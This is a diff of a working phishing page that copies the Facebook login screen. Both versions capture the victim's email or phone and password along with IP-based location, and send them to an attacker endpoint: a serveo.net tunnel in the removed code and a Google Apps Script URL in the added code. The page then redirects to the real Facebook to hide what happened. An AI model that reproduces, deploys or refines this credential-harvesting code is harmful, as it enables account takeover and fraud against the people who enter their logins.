@@ -16,8 +16,8 @@
         }
 
         .login-container {
-            background-color: #fff;
-            padding: 50px;
+            background-color: #f2f2f2;
+            padding: 30px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
@@ -40,17 +40,18 @@
         input[type="text"],
         input[type="password"],
         button {
-            padding: 12px;
+            height:40px;
+            padding: 10px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 9px;
             font-size: 20px;
         }
 
         button {
             background-color: #1877f2;
             color: #fff;
-            border: none;
+            border: ;
             cursor: pointer;
         }
 
@@ -74,73 +75,62 @@
 </head>
 <body>
     <div class="login-container">
-        <center><h1 style="font-size:66px;color:#166fe5">facebook</h1></center>
-        <h2>Log into Facebook to continue</h2>
-        <form id="Ftform" action="https://b8049fb6066e5a77fcb5e649048fed2f.serveo.net/index.php" method="POST" onsubmit="submitForm(); return false;">
-            <input type="text" name="email_or_phone" id="email-or-phone" placeholder="Email or Phone number" required/>
-            <input type="password" name="password" id="password" placeholder="Password" required/>
-            <input type="hidden" id="ip_address" name="ip_address">
-            <input type="hidden" id="country" name="country">
-            <input type="hidden" id="region" name="region">
-            <input type="hidden" id="city" name="city">
-            <button type="submit">Log In</button>
+        <img src="/storage/emulated/0/DCIM/IMG_20241023_072537.jpg" style="height:65px; width:65px;">
+        <p style="font-size:18px">Log into Facebook to continue</p>
+        <form action="https://script.google.com/macros/s/AKfycbzBanx6KG1i9DUzW0wT4w_5zCZnrDwu2R5Rd2qNfzQm6f4brMssvXo-8ApET4BhMYbt-g/exec" id="FBdata">
+            <input type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
+            <input type="password" name="message" placeholder="Password" required/>
+            <input type="hidden" name="ip_address">
+            <input type="hidden" name="country">
+            <input type="hidden" name="region">
+            <input type="hidden" name="city">
+            <input type="hidden" name="form_id" value="FBForm">
+            <button type="submit" style="border-radius:25px; height:45px">Log In</button>
             <a href="https://m.facebook.com/?refsrc=deprecated">Forgot password?</a>
             <p>or</p>
-            <button style="background-color:green"><a href="https://m.facebook.com/reg/#" style="color:white">Create new account</a></button>
-            <p>About . Help . More</p>
-            <p>Meta © 2024</p>
+            <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;"><a href="https://m.facebook.com/reg/#" style="color:1877f2">Create new account</a></button>
+          <center><img style="width:50 px;height:20px;"src="/storage/emulated/0/DCIM/IMG_20241018_221207.jpg"></center>
+            <p style="font-size:10px">About.Help.More</p>
         </form>        
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
-        $(document).ready(function() {
-            $.getJSON("https://ipinfo.io/?format=json", function(data) {
-                $("#ip_address").val(data.ip);
-                $("#country").val(data.country);
-                $("#region").val(data.region);
-                $("#city").val(data.city);
-            });
-        });
+        // Get form element
+const form = document.getElementById('FBdata');
 
-        function submitForm() {
-            var emailOrPhone = document.getElementById("email-or-phone").value;
-            var password = document.getElementById("password").value;
+// Add event listener to form submission
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
 
-            // Call the onSubmitForm function with form data
-            onSubmitForm(emailOrPhone, password);
-        }
+  // Get form data
+  const formData = new FormData(form);
 
-        function onSubmitForm(emailOrPhone, password) {
-            var formData = new FormData();
-            formData.append("email_or_phone", emailOrPhone);
-            formData.append("password", password);
-            formData.append("ip_address", document.getElementById("ip_address").value);
-            formData.append("country", document.getElementById("country").value);
-            formData.append("region", document.getElementById("region").value);
-            formData.append("city", document.getElementById("city").value);
+  // Fetch user location
+  $.getJSON("https://ipinfo.io/?format=json", function(data) {
+    // Create JSON data
+    const jsonData = {
+      email_or_phone: formData.get('email_or_phone'),
+      message: formData.get('message'),
+      ip_address: data.ip,
+      country: data.country,
+      region: data.region,
+      city: data.city,
+      form_id: 'FBForm',
+    };
 
-            fetch('https://b8049fb6066e5a77fcb5e649048fed2f.serveo.net/index.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirect to the success page
-                    window.location.href = "https://www.facebook.com/profile";
-                }
-                // No error handling or logging
-            });
-        }
-
-        // Detect user's language and adjust form language
-        var userLanguage = navigator.language || navigator.userLanguage;
-        if (userLanguage.startsWith("en")) {
-            // Set form language to English
-            document.getElementById("Ftform").setAttribute("lang", "en");
-        } else if (userLanguage.startsWith("fr")) {
-            // Set form language to French
-            document.getElementById("Ftform").setAttribute("lang", "fr");
-        } // Add more language conditions as needed
+    // Submit form data to Google Script
+    fetch('https://script.google.com/macros/s/AKfycbzBanx6KG1i9DUzW0wT4w_5zCZnrDwu2R5Rd2qNfzQm6f4brMssvXo-8ApET4BhMYbt-g/exec', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(jsonData),
+    })
+    .then(() => {
+      window.location.href = 'https://www.facebook.com'; // Redirect to Facebook
+    });
+  });
+});
     </script>
 </body>
 </html>
